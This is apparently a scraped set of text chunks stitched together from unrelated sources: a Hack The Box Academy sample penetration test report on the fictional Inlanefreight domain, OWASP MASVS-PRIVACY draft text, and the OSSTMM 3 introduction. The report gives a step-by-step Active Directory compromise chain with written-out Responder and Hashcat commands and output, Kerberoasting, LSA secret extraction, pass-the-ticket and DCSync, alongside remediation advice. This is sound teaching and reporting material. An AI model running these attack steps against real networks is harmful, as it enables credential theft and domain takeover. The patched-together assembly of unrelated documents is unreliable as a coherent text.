(“Inlanefreight” herein) contracted Hack The Box Academy to perform a Network Penetration Test of Inlanefreight’s internally facing network to identify security weaknesses, determine the impact to Inlanefreight, document all findings in a clear and repeatable manner, and provide remediation recommendations. Approach Hack The Box Academy performed testing under a “black box” approach May 12, 2022, to May 31, 2022 without credentials or any advance knowledge of Inlanefreight’s internally facing environment with the goal of identifying unknown weaknesses. Testing was performed from a non-evasive standpoint with the goal of uncovering as many misconfigurations and vulnerabilities as possible. Testing was performed remotely via a host that was provisioned specifically for this assessment. Each weakness identified was documented and manually investigated to determine exploitation possibilities and escalation potential. Hack The Box Academy sought to demonstrate the full impact of every vulnerability, up to and including internal domain compromise. If Hack The Box Academy were able to gain a foothold in the internal network, Inlanefreight allowed for further testing including lateral movement and horizontal/vertical privilege escalation to demonstrate the impact of an internal network compromise.",

If Hack The Box Academy were able to gain a foothold in the internal network, Inlanefreight allowed for further testing including lateral movement and horizontal/vertical privilege escalation to demonstrate the impact of an internal network compromise. 5\\nScope The scope of this assessment was one internal network range and the INLANEFREIGHT.LOCAL Active Directory domain. In-Scope Assets Host/URL/IP Address Description 192.168.195.0/24 Inlanefreight internal network Table 1: Scope Details Assessment Overview and Recommendations During the internal penetration test against Inlanefreight, Hack The Box Academy identified seven (7) findings that threaten the confidentiality, integrity, and availability of Inlanefreight’s information systems. The findings were categorized by severity level, with five (5) of the findings being assigned a high-risk rating, one (1) medium-risk, and one (1) low risk. There was also one (1) informational finding related to enhancing security monitoring capabilities within the internal network. The tester found Inlanefreight’s patch and vulnerability management to be well-maintained. None of the findings in this report were related to missing operating system or third-party patches of known vulnerabilities in services and applications that could result in unauthorized access and system compromise. Each flaw discovered during testing was related to a misconfiguration or lack of hardening, with most falling under the categories of weak authentication and weak authorization. One finding involved a network communication protocol that can be “spoofed” to retrieve passwords for internal users that can be used to gain unauthorized access if an attacker can gain unauthorized access to the network without credentials. In most corporate environments, this protocol is unnecessary and can be disabled. It is enabled by default primarily for small and medium sized businesses that do not have the resources for a dedicated hostname resolution (the “phonebook” of your network) server. During the assessment, the presence of these resources was observed on the network, so Inlanefreight should begin formulating a test plan to disable the dangerous service. The next issue was a weak configuration involving service accounts that allows any authenticated user to steal a component of the authentication process that can often be guessed offline (via password “cracking”) to reveal the human-readable form of the account’s password. These types of service accounts typically have more privileges than a standard user, so obtaining one of their passwords in clear text could result in lateral movement or privilege escalation and eventually in complete internal network compromise. The tester also noticed that the same password was used for administrator access to all servers within the internal network. This means that if one server is compromised, an attacker can re-use this password to access any server that shares it for administrative access. Fortunately, both issues can be corrected without the need for third-party tools. Microsoft’s Active Directory contains settings that can be used to minimize the risk of these resources being abused for the benefit of malicious users. A webserver was also found to be running a web application that used weak and easily",

    "text": "issues can be corrected without the need for third-party tools. Microsoft’s Active Directory contains settings that can be used to minimize the risk of these resources being abused for the benefit of malicious users. A webserver was also found to be running a web application that used weak and easily guessable credentials to access an administrative console that can be leveraged to gain unauthorized access to the underlying server. This could be exploited by an attacker on the internal network without needing a valid user account. This attack is very well- documented, so it is an exceedingly likely target can be particularly damaging, even in the hands of an unskilled attacker. Ideally, direct external access to this service would be disabled, but if it cannot be, it should be reconfigured with exceptionally strong credentials that are rotated frequently. Inlanefreight may also want to consider maximizing the log data collected from this device to ensure that attacks against it can be detected and triaged quickly. 6\\nThe tester also found shared folders with excessive permissions, meaning that all users in the internal network can access a considerable amount of data. While sharing files internally between departments and users is important to day-to-day business operations, wide open permissions on file shares may result in unintentional disclosure of confidential information. Even if a file share does not contain any sensitive information today, someone may unwittingly put such data there thinking it is protected when it isn’t. This configuration should be changed to ensure that users can access only what is necessary to perform their day-to-day duties. Finally, the tester noticed that testing activities seemed to go mostly unnoticed, which may represent an opportunity to improve visibility into the internal network and indicates that a real-world attacker might remain undetected if internal access is achieved. Inlanefreight should create a remediation plan based on the Remediation Summary section of this report, addressing all high findings as soon as possible according to the needs of the business. Inlanefreight should also consider performing periodic vulnerability assessments if they are not already being performed. Once the issues identified in this report have been addressed, a more collaborative, in-depth Active Directory security assessment may help identify additional opportunities to harden the Active Directory environment, making it more difficult for attackers to move around the network and increasing the likelihood that Inlanefreight will be able to detect and respond to suspicious activity. 7\\nNetwork Penetration Test Assessment Summary Hack The Box Academy began all testing activities from the perspective of an unauthenticated user on the internal network. Inlanefreight provided the tester with network ranges but did not provide additional information such as operating system or configuration information. Summary of Findings During the course of testing, Hack The Box Academy uncovered a total of seven (7) findings that pose a material risk to Inlanefreight’s information systems. Hack The Box Academy also identified one informational finding that, if addressed, could further strengthen Inlanefreight’s overall security posture. Informational findings are observations for areas of improvement",

The steps below demonstrate the steps taken from initial access to compromise and does not include all vulnerabilities and misconfigurations discovered during the course of testing. Any issues not used as part of the path to compromise are listed as separate, standalone issues in the Technical Findings Details section, ranked by severity level. The intent of this attack chain is to demonstrate to Inlanefreight the impact of each vulnerability shown in this report and how they fit together to demonstrate the overall risk to the client environment and help to prioritize remediation efforts (i.e., patching two flaws quickly could break up the attack chain while the company works to remediate all issues reported). While other findings shown in this report could be leveraged to gain a similar level of access, this attack chain shows the initial path of least resistance taken by the tester to achieve domain compromise. Detailed Walkthrough Hack The Box Academy performed the following to fully compromise the INLANEFREIGHT.LOCAL domain. 1. The tester utilized the Responder tool to obtain an NTLMv2 password hash for a domain user, bsmith. 2. This password hash was successfully cracked offline using the Hashcat tool to reveal the user's clear text password which granted a foothold into the INLANEFREIGHT.LOCAL domain, but with no more privileges than a standard domain user. 3. The tester then ran the BloodHound.py, a Python version of the popular SharpHound collection tool to enumerate the domain and create visual representations of attack paths. Upon review, the tester found that multiple privileged users existed in the domain configured with Service Principal Names (SPNs), which can be leveraged to perform a Kerberoasting attack and retrieve TGS Kerberos tickets for the accounts which can be cracked offline using Hashcat if a weak password is set.

From here, the tester used the GetUserSPNs.py tool to carry out a targeted Kerberoasting attack against the mssqlsvc account, having found that the mssqlsvc account had local administrator rights over the host SQL01.INLANEFREIGHT.LOCAL which was an interesting target in the domain. 4. The tester was able to successfully crack this account's password offline, revealing the clear text value. 5. The tester was able to authenticate to the host SQL01.INLANEFREIGHT.LOCAL and retrieve a clear text password from the host's registry by decrypting LSA secrets for an account (srvadmin) which was set up for autologon. 6. This srvadmin account had local administrator rights over all servers (aside from Domain Controllers) in the domain so the tester was able to log into the MS01.INLANEFREIGHT.LOCAL host and retrieve a Kerberos TGT ticket for a logged in user, pramirez, who was part of the Tier I Server Admins group which granted the account DCSync rights over the domain object. This attack can be utilized to retrieve the NTLM password hash for any user in the domain, resulting in domain compromise and persistence via a Golden Ticket. 7. The tester used the Rubeus tool to extract the Kerberos TGT ticket for the pramirez user and perform a Pass-the- Ticket attack to authenticate as this user. 8. Finally, the tester was able to perform a DCSync attack after successfully authenticating with this user account via the Mimikatz tool which ended in domain compromise. 9\\nDetailed reproduction steps for this attack chain are as follows: Upon connecting to the network, the tester started the Responder tool and was able to capture a password hash for the bsmith user by spoofing NBT-NS/LLMNR traffic on the local network segment. $ sudo responder -I eth0 -wrfv __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR & MDNS Responder 3.0.6.0 <SNIP> [+] Generic Options: Responder NIC [eth0] Responder IP [192.168.195.168] Challenge set [random] Don't Respond To Names ['ISATAP'] [+] Current Session Variables: Responder Machine Name [WIN-TWWXTGD94CV] Responder Domain Name [3BKZ.LOCAL] Responder DCE-RPC Port [47032] [+] Listening for events... <SNIP> [SMB] NTLMv2-SSP Client : 192.168.195.205 [SMB] NTLMv2-SSP Username : INLANEFREIGHT\\bsmith [SMB] NTLMv2-SSP Hash : bsmith::INLANEFREIGHT:7ecXXXXXX98ebc:73D1B2XXXXXXXXXXX45085A651:010100000000000000B588D9F766D801191BB2236A5FA AA50000000002000800330042004B005A0001001E00570049004E002D0054005700570058005400470044003900340043005600040034 00570049004E002D00540057005700580054004700440039003400430056002E00330042004B005A002E004CXXXXXXXXXXXXXXXXXXXXX XXXXXXXXXXX2E004C004F00430041004C000700080000B588D9F766D80106000400020000000800300030000000000000000100000000 2000002CAE5BF3BB1FD2F846A280AEF43A8809C15207BFCB4DF5A580BA1B6FCAF6BBCE0A0010000000000000000000000000000000000 00900280063006900660073002F003100390032002E003100360038002E003100390035002E0031003600380000000000000000000000 0000 <SNIP> Figure 1: Retrieving Password Hash with Responder The tester was able to \"crack\" this password hash offline using the Hashcat tool and retrieve the clear text password value, thus granting a foothold to enumerate the Active Directory domain. $ hashcat -m 5600 bsmith_hash /usr/share/wordlists/rockyou.txt hashcat (v6.1.1) starting... <SNIP> Dictionary cache hit: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 BSMITH::INLANEFREIGHT:7eccd965c4b98ebc:73d1b2c8c5f9861eefd31bb45085a651:010100000000000000b588d9f766d801191bb 2236a5faaa50000000002000800330042004b005a0001001e00570049004e002d00540057005700580054004700440039003400430056 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX004700440039003400430056002e00330042004b005a0 02e004c004f00430041004c0003001400330042004b005a002e004c004f00430041004c0005001400330042004b005a002e004c004f00 430041004c000700080000b588d9f766d801060004000200000008003000300000000000000001000000002000002cae5bf3bb1fd2f84 6a280aef43a8809c15207bfcb4df5a580ba1b6fcaf6bbce0a001000000000000000000000000000000000000900280063006900660073 002f003100390032002e003100360038002e003100390035002e00310036003800000000000000000000000000:<REDACTED> Figure 2: Cracking Password Hash with Hashcat The tester proceeded",

Remediation efforts are prioritized below starting with those that will likely take the least amount of time and effort to complete. Inlanefreight should ensure that all remediation steps and mitigating controls are carefully planned and tested to prevent any service disruptions or loss of data. Short Term  [Finding 2] – Set strong (24+ character) passwords on all SPN accounts  [Finding 5] – Change the default admin credentials for the Tomcat Manager  [Finding 7] – Disable Directory Listing on the affected web server  Enforce a password change for all users because of the domain compromise Medium Term  [Finding 1] – Disable LLMNR and NBT-NS wherever possible  [Finding 2] – Transition from SPNs to Group Managed Service Accounts (gMSA) wherever possible  [Finding 3] – Implement a solution such as the Microsoft Local Administrator Password Solution\" (LAPS)  [Finding 4] – Enhance the domain password policy  [Finding 4] – Consider implementing an enterprise password manager  [Finding 5] – Consider limiting access to the Tomcat Manager to localhost or specific IP Addresses  [Finding 6] – Perform a network file share audit  [Finding 8] – Enhance network logging and monitoring  [Finding 8] – Implement an enterprise endpoint detection & response solution Long Term  Perform ongoing internal network vulnerability assessments and domain password audits  Perform periodic Active Directory security assessments  Educate systems and",

LLMNR/NBT-NS Response Spoofing - High CWE CWE-522 CVSS 3.1 Score 9.5 By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary-controlled system. This activity may be used to collect or relay authentication materials. Description (Incl. Root Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Cause) Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary-controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary-controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through Network Sniffing and crack Security Impact the hashes offline through Brute Force to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary- controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system relay step can happen in conjunction with poisoning but may also be independent of it. Several tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and Responder. Affected Domain  INLANEFREIGHT.LOCAL  Disable LLMNR and NetBIOS in local computer security settings or by group policy if they are not needed within an environment  Use host-based security software to block LLMNR/NetBIOS traffic. Enabling SMB Signing can stop NTLMv2 relay attacks. Remediation  Network intrusion detection and prevention systems that can identify traffic patterns indicative of MiTM activity can be used to mitigate activity at the network level.  Network segmentation can be used to isolate infrastructure components that do not require broad network access. This may mitigate, or at least alleviate, the scope of MiTM activity.

Weak Kerberos Authentication (“Kerberoasting”) - High CWE CWE-522 CVSS 3.1 Score 9.5 In an Active Directory (AD) environment, Service Principal Names (SPNs) are used to uniquely identify instances of a Windows service. Kerberos authentication requires that each SPN be associated with one service account (Active Directory user account). Any authenticated AD user can request one or more Kerberos Ticket-Granting Service (TGS) tickets from the domain Description (Incl. Root controller for any SPN accounts. These tickets are encrypted with the associated AD account’s Cause) NTLM password hash. They can be brute forced offline using a password cracking tool such as Hashcat if a weak password is used along with the RC4 encryption algorithm. If AES encryption is in use, it will take more resources to “crack” a ticket to reveal the account’s clear-text password, but it is possible if weak passwords are in use. A successful Kerberoasting attack along with cracked passwords could lead to lateral movement and privilege escalation in an AD environment. If a password is cracked for a Security Impact Domain Administrator account or equivalent, an attacker could gain control over most, if not all, resources in the domain. Affected Domain  INLANEFREIGHT.LOCAL Where possible eliminate SPNs in the environment in favor of Group Managed Service Accounts (gMSA) which are not subject to this type of attack. If migration to gMSAs is not possible the following steps will help mitigate the risk of this attack: Remediation  Enable AES Kerberos encryption instead of RC4  Use strong 25+ character passwords for service accounts and rotate them periodically  Limit the privileges of service accounts and avoid creating SPNs tied to highly privileged accounts such as Domain Administrators External References https://attack.mitre.org/techniques/T1558/003/ Finding Evidence: Retrieving a listing all SPN accounts in the INLANEFREIGHT.LOCAL domain using the GetUserSPNs.py tool from the Impacket toolkit.",

Root It appeared that Inlanefreight did not notice “noisy” activities during the course of testing. The Cause) tester was also not blocked when using standard open-source penetration testing tools. If network and endpoint detection and response are inadequate, an attacker who can gain a Security Impact foothold in the internal network may be able to move laterally, perform post-exploitation, and achieve persistence easily. Consider investing in a more advanced network monitoring solution, configuring logging on all hosts, and processing them for anomalies using a SIEM tool, and implementing endpoint detection on each server and workstation that is more difficult to bypass and tamper with. The Remediation organization should not rely on endpoint protection alone. When combined with a defense-in- depth security strategy, they can be an excellent tool for detecting an attacker who gains internal network access and is forced to perform “noisier” and riskier activities to the nature of the hardened environment.

    "text": "mas.owasp.org Closed for comments on the 30th of November 2023. Thank you for contributing! - The OWASP MAS team - Introduction Mobile applications frequently access sensitive user data to deliver their core functionalities. This data ranges from personally identifiable information (PII), health metrics, location data, to device identifiers. Mobile devices are a constant companion to users, always connected, and equipped with numerous sensors—including cameras, microphones, GPS and BLE—that generate data capable of inferring user behavior and even identifying individuals. The landscape is further complicated by advanced tracking techniques, the integration of third-party SDKs, and a heightened awareness of privacy issues among users and regulators. As a response, there's a growing trend towards on-device processing to keep user data localized and more secure. It's crucial to protect this data both to gain the trust of users and to comply with global privacy regulations, such as the General Data Protection Regulation (GDPR) in Europe, the Children's Online Privacy Protection Rule (COPPA) and the California Consumer Privacy Act (CCPA) in the U.S., and similar legislation being considered by governments and regulators around the world. With data becoming a valuable asset for many businesses, apps frequently incorporate third-party tools, such as Software Development Kits (SDKs), to analyze user activity or display ads. These tools can sometimes collect and share data with other companies, often without the clear knowledge or consent of the user. Beyond that, many of these third-party tools monetize the collected data by building services on top of it. They can also create separate data intelligence offerings, such as analytics databases, further enriching their own ecosystem at the expense of user privacy. While making sure the app handles data securely—ensuring its confidentiality, integrity, and availability—is a basic step for an effective data protection strategy (addressed by other categories of the current OWASP Mobile Application Security Verification Standard (MASVS) such as MASVS-STORAGE, MASVS-CRYPTO, or MASVS-NETWORKING), it's distinct from the broader concept of data privacy. Data security focuses on safeguarding data from unauthorized access, while data privacy emphasizes the rights of users and how data is collected, processed, stored, and shared. This category takes the OWASP MASVS a step further, looking deeper into the challenges of adding\\nused, stored, and shared in a way that respects user privacy and conforms to best practices. It does so by following a “privacy by design and by default” approach, accentuating core principles like data minimization, unlinkability, transparency, and intervenability. Scope The main goal of MASVS-PRIVACY is to provide a baseline for user privacy. It is not intended to cover all aspects of user privacy, especially when other standards and regulations such as ENISA or the GDPR already do that. We focus on the app itself, looking at what can be tested using information that's publicly available or found within the app through methods like static or dynamic analysis. While some associated tests can be automated, others necessitate manual intervention due to the nuanced nature of privacy. For example, if an app collects data that it didn't mention in",

While some associated tests can be automated, others necessitate manual intervention due to the nuanced nature of privacy. For example, if an app collects data that it didn't mention in the app store or its privacy policy, it takes careful manual checking to spot this. Note on \"Data Collection and Sharing\" For the MASTG tests, we treat \"Collect\" and \"Share\" in a unified manner. This means that whether the app is sending data to another server or transferring it to another app on the device, we view it as data that's potentially leaving the user's control. Validating what happens to the data on remote endpoints is challenging and often not feasible due to access restrictions and the dynamic nature of server-side operations. Therefore, this issue is outside of the scope of the MASVS.\\nImportant Disclaimer MASVS-PRIVACY is not intended to serve as an exhaustive or exclusive reference. While it provides valuable guidance on app-centric privacy considerations, it should never replace comprehensive assessments, such as a Data Protection Impact Assessment (DPIA) mandated by the General Data Protection Regulation (GDPR) or other pertinent legal and regulatory frameworks. Stakeholders are strongly advised to undertake a holistic approach to privacy, integrating MASVS-PRIVACY insights with broader assessments to ensure comprehensive data protection compliance. Given the specialized nature of privacy regulations and the complexity of data protection, these assessments are best conducted by privacy experts rather than security experts.

Apps should only request access to the data they absolutely need for their functionality and always with informed consent from the user. This control ensures that apps practice data minimization and restricts access control, reducing the potential impact of data breaches or leaks. Furthermore, apps should share data with third parties only when necessary, and this should include enforcing that third-party SDKs operate based on user consent, not by default or without it. Apps should prevent third-party SDKs from ignoring consent signals or from collecting data before consent is confirmed. Additionally, apps should be aware of the 'supply chain' of SDKs they incorporate, ensuring that no data is unnecessarily passed down their chain of dependencies. This end-to-end responsibility for data aligns with recent SBOM regulatory requirements, making apps more accountable for their data practices.

This end-to-end responsibility for data aligns with recent SBOM regulatory requirements, making apps more accountable for their data practices. MASVS-PRIVACY-2 The app prevents identification of the user. Protecting user identity is crucial. This control emphasizes the use of unlinkability techniques like data abstraction, anonymization and pseudonymization to prevent user identification and tracking. Another key aspect addressed by this control is to establish technical barriers when employing complex 'fingerprint-like' signals (e.g. device IDs, IP addresses, behavioral patterns) for specific purposes. For instance, a fingerprint used for fraud detection should be isolated and not repurposed for audience measurement in an analytics SDK. This ensures that each data stream serves its intended function without risking user privacy.\\nMASVS-PRIVACY-3 The app is transparent about data collection and usage. Users have the right to know how their data is being used. This control ensures that apps provide clear information about data collection, storage, and sharing practices, including any behavior a user wouldn't reasonably expect, such as background data collection. Apps should also adhere to platform guidelines on data declarations. MASVS-PRIVACY-4 The app offers user control over their data. Users should have control over their data. This control ensures that apps provide mechanisms for users to manage, delete, and modify their data, and change privacy settings as needed (e.g. to revoke consent). Additionally, apps should re-prompt for consent and update their transparency disclosures when they require more data than initially specified.\\nTests In privacy testing, much like with security, the specific context and use case play a big role. While some tests might not show an outright violation, they're designed to provide clear and relevant evidence. This ensures that a reviewer can make a well-informed decision about potential issues. A prerequisite for privacy testing with the MASTG, is to clearly identify data considered sensitive in the context of the mobile app and to understand how both the first-party and any third-party partners utilize each type of data. For instance, if your app gathers an email address for user authentication and to tailor their experience, that touches on both App Functionality and Product Personalization. To get a clearer picture of these nuances, it's a good idea to refer to resources like Apple's App Privacy Details and Google Play's Data Usage Guidelines. MASVS-PRIVACY-1: The app minimizes access to sensitive data and resources. ● Validate Data Access Scope Description: Ensure the app only accesses data essential for its functionality. - Ensure metadata with data protection relevance is removed when using device sensors (e.g. camera, microphone). - Erase personal data as soon as its purpose is fulfilled. ● Permission Management Description: Ensure only necessary permissions are requested when they are really needed. - Review permissions required by the app. - Review permissions required by third-party libraries and SDKs. - Use privacy-friendly APIs provided by the platform as alternatives to permissions (e.g. use the Photo Picker API instead of the storage permission; when pairing",

If possible, trace when the app accesses protected resources (from the OS side), the same way that the Privacy Dashboard an android and the Privacy Report does on iOS. - Check if permissions are revoked when no longer needed.\\nMASVS-PRIVACY-2: The app prevents identification of the user. ● Anonymization and Pseudonymisation Measures Description: Ensure techniques like anonymisation and pseudonymisation are implemented to prevent user identification. - Stripping data of any direct identifiers, such as user ID or name, before server-side collection. - Manipulating data to break the linkage and prevent re-linkage to real-world identities. - Check for use of Private (Information) Retrieval protocols and OHTTP (Oblivious HTTP). ● Identifier Management Review Description: Avoid using identifiers that are unique, or probabilistically unique. Instead, opt for identifiers that can be reset, except for user safety purposes when there are no alternative methods available. If you use advertising IDs, make sure they are only used for advertising purposes. - Only use an advertising ID for user profiling or ad-serving use cases. - For non-ad-serving use cases, use a privately stored globally-unique ID (GUID), which is app-scoped. - Check for identifiers generated using device or network data for the purpose of uniquely identifying a device. - Use the secure settings Android ID (SSAID) to share state between the apps that you own without requiring the user to sign in to an account (Android). MASVS-PRIVACY-3: The app is transparent about data collection and usage. ● Consent Management and User Awareness Description: Obtain explicit user consent before accessing sensors or local data. - Check for informative notifications or prompts. - Review purpose strings explaining data access needs. ● Data Collection and Sharing Description: Ensure sensitive data isn't shared with third parties unless necessary and users are informed both from the app and third-party code. - Ensure adherence to platform guidelines on data declarations. - Review data sent to app servers. - Review data sent to trackers. - Prevent data exchange between apps unless explicitly specified or chosen by the user. - Ensure local data processing mechanisms are prioritized (e.g. iOS on-device processing or Android On-Device Machine Learning and Private Compute Services). - Provide the user with a list of each third party with whom information about the user is shared, identify the categories of data shared with each third party, and provide links to those parties.\\n● Privacy Policy",

MASVS-PRIVACY-4: The app offers user control over their data. ● Data Management Mechanisms Description: Ensure mechanisms are in place for users to delete all their data and modify privacy settings with granularity. - Offer mechanisms to delete all user data. - Allow users to modify privacy settings with granularity and revert to default settings. MAS-P - Baseline Privacy Profile The MAS-P profile establishes a foundational set of practices mobile apps should comply with to safeguard users' personally identifiable information (PII) and ensure compliance with prevailing data protection regulations. MAS-P serves as a baseline for privacy and is intended to work cohesively, and in some cases even overlap, with other OWASP MAS profiles, such as MAS-L1 and MAS-L2, ensuring a holistic approach to both security and privacy.",

These facts provide actionable information that can measurably improve your operational security. By using the OSSTMM you no longer have to rely on general best practices, anecdotal evidence, or superstitions because you will have verified information specific to your needs on which to base your security decisions.

Those who want to jump right into testing while using it may find the following quick-start information helpful. Quick Start To start making an OSSTMM test you will need to track what you test (the targets), how you test them (the parts of the targets tested and not the tools or techniques used), the types of controls discovered, and what you did not test (targets and parts of the targets). Then you may conduct the test as you are accustomed to with the objective of being able to answer the questions in the Security Test Audit Report (STAR) available at the end of this manual or as its own document. The STAR gives the specific test information on the state of the scope for the benefits of having a clear statement of the security metrics and details for comparisons with previous security tests or industry test averages. More details on the required information for the STAR is available throughout this manual and can be referenced as needed. As you may see, taking this approach means that very little time is required in addition to a standard test and the formalization of the report. It has been reported that this methodology actually reduces testing and reporting time due to the efficiencies introduced into the process. There should be no time or financial reason to avoid using the OSSTMM and no unreasonable restrictions are made to the tester. Upgrading from Older Versions If you are familiar with the OSSTMM 2.x series then you will find that the methodology has completely changed. The new rav provides a factual attack surface metric that is much more accurate for measuring the susceptibility to attacks. There are many other changes and enhancements as well but the primary focus has been to move away from solution-based testing which assumes specific security solutions will be found in a scope and are required for security (like a firewall). Another change you may notice is that there is now a single security testing methodology for all channels: Human, Physical, Wireless, Telecommunications, and Data Networks. The rav information from 2.x to 3.0 is incompatible. Those with early 3.0 draft rav (prior to RC 12) will require that the values be re-calculated using this final attack surface calculation which is available as a spreadsheet calculator at http://www.isecom.org/ravs. Previous OSSTMM security metrics measured risk with degradation however this version does not. Instead, the focus now",

Instead, the focus now is on a metric for the attack surface (the exposure) of a target or scope. This allows for a factual metric that has no bias or opinion like risk does. Our intention is to eventually eliminate the use of risk in areas of security which have no set price value of an asset (like with people, personal privacy, and even fluctuating markets) in favor of trust metrics which are based completely on facts. Much of the terminology has changed in this version to provide a professional definition of that which can actually be created or developed. This is most notable in definitions for security and safety which take more specific and concrete meanings for operations within. Since so much has changed from previous versions, as this is a completely re-written methodology, we recommend you read through it once before using it.

Sometime later, third party verification came from the popular notion of builder blindness that says those closest to the target will generally and usually involuntarily miss the most problems. This became the standard procedure for a while and is still widely regarded as true even though it actually means that an outsider with less knowledge of the target is supposedly more capable of understanding that target than the operator. At some point, the pendulum began to swing back the other way. Whether this happened for either efficiency or economic reasons is unclear, but it has brought about an important shift to provide the operators with security testing ability. It has led to simplified frameworks, software, checklists, tool kits, and many other ways to make security testing easy enough that anyone can do it. That’s a good thing. Unfortunately, there is no complex subject for which the simplification process is not itself complex nor the end result significantly less than the whole. This means that to make a security testing solution simple enough for non-experts to execute, the solution requires a complex back-end to collect the data according to preconceived rules. This assumes that operations always run according to design and configuration. It also assumes the solution developer has taken into account all the possibilities for where, what, and how data can be gathered. Furthermore it assumes that the data gathered can be properly sorted into a uniform format for comparison and rule-based analysis. None of those tasks are simple. Assuming that can be done, it would still require an exhaustive database of possibilities for the numerous representations of security and layers of controls to deduce security problems. While minimizing false positives through correlations based on the rules, laws, underlying premise, operation, process, and technology involved. This solution could then be able to provide a clear, concise report and metric. This solution would need to have more than just the framework, software, checklist, or toolkit which it produces; it would need a methodology. A security methodology is not a simple thing. It is the back-end of a process or solution which defines what or who is tested as well as when and where. It must take a complex process and reduce it into elemental processes and sufficiently explain",

It must take a complex process and reduce it into elemental processes and sufficiently explain the components of those processes. Then the methodology must explain the tests for verifying what those elemental processes are doing while they are doing, moving, and changing. Finally, the methodology must contain metrics both to assure the methodology has been carried out correctly and to comprehend or grade the result of applying the methodology. So, making a security testing methodology is no small feat. With each new version of the OSSTMM we get closer to expressing security more satisfactorily than previous versions. It’s not that this OSSTMM 3 promotes revolutionary ideas but rather it applies many new pragmatic concepts which will improve security. We are coming ever closer to truly understanding what makes us safe and secure. For a chance of having this enlightenment, I want to thank all the contributors to the OSSTMM, the ISECOM team, all the ISECOM certified students who care about the right way to do security testing, all those teaching Hacker Highschool to the next generation, all supporters of the ISECOM projects including the ISECOM Training Partners, ISECOM Licensed Auditors, and finally my very patient and supportive wife who understands how important this is to me and to the world we need to improve.

When a security test is an art then the result is unverifiable and that undermines the value of a test. One way to assure a security test has value is to know the test has been properly conducted. For that you need to use a formal methodology. The OSSTMM aims to be it. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 10\\nIntroduction The Open Source Security Testing Methodology Manual (OSSTMM) provides a methodology for a thorough security test, herein referred to as an OSSTMM audit. An OSSTMM audit is an accurate measurement of security at an operational level that is void of assumptions and anecdotal evidence. As a methodology it is designed to be consistent and repeatable. As an open source project, it allows for any security tester to contribute ideas for performing more accurate, actionable, and efficient security tests. Further it allows for the free dissemination of information and intellectual property. Since its start at the end of 2000, the OSSTMM quickly grew to encompass all security channels with the applied experience of thousands of reviewers. By 2005, the OSSTMM was no longer considered just a best practices framework. It had become a methodology to assure security was being done right at the operational level. As security audits became mainstream, the need for a solid methodology became critical. In 2006, the OSSTMM changed from defining tests based on solutions such as firewall tests and router tests to a standard for those who needed a reliable security test rather than just a compliance report for a specific regulation or legislation. Since environments are significantly more complex than in years past due such things as remote operations, virtualization, cloud computing, and other new infrastructure types, we can no longer think in simplistic tests meant only for desktops, servers, or routing equipment. Therefore, with version 3, the OSSTMM encompasses tests from all channels - Human, Physical, Wireless, Telecommunications, and Data Networks. This also makes it a perfectly suited for testing cloud computing, virtual infrastructures, messaging middleware, mobile communication infrastructures, high-security locations, human resources, trusted computing, and any logical processes which all",

    "text": "equipment. Therefore, with version 3, the OSSTMM encompasses tests from all channels - Human, Physical, Wireless, Telecommunications, and Data Networks. This also makes it a perfectly suited for testing cloud computing, virtual infrastructures, messaging middleware, mobile communication infrastructures, high-security locations, human resources, trusted computing, and any logical processes which all cover multiple channels and require a different kind of security test. A set of attack surface metrics, called ravs, provide a powerful and highly flexible tool that can provide a graphical representation of state, and show changes in state over time. This integrates well with a ’dashboard’ for management and is beneficial for both internal and external testing, allowing a comparison/combination of the two. Quantitative risk management can be done from the OSSTMM Audit report findings, providing a much improved result due to more accurate, error free results however you will find the proposed trust management here to be superior to risk management. The OSSTMM includes information for project planning, quantifying results, and the rules of engagement for performing security audits. The methodology can be easily integrated with existing laws and policies to assure a thorough security audit through all channels. Legal and industry specific regulations also commonly require a security audit as a component of becoming compliant. An OSSTMM audit is well suited for most all of these cases. Specific OSSTMM tests can therefore be connected with particular security standard requirements, making the OSSTMM itself a way to gain compliance to those requirements. This applies to regulations and policies from physical security like the US Federal Energy Reserve Commission’s ruling to pure data security efforts such as the latest PCI-DSS and including cross-channel requirements as found in many NIST recommendations and information security management specifications like ISO/IEC 27001:2005, ISO/IEC 27002:2005, and ISO/IEC 27005:2008. It is recommended that you read through the OSSTMM once completely before putting it into practice. It aims to be a straight-forward tool for the implementation and documentation of a security test. Further assistance for those who need help in understanding and implementing this methodology is available at the ISECOM website.

Some of the words used in this document may stray from the definition you are familiar with. New research often requires updating, enhancing, or retracting information from the world as we thought we have known it. This is a normal occurrence and to assist you with the changes, this document does try to define these words properly in their new context. In this document, an OSSTMM audit or “audit” is the result of the analysis performed after an OSSTMM test. The person who performs this function of test and analysis is referred to as the Security Analyst or just “Analyst”.

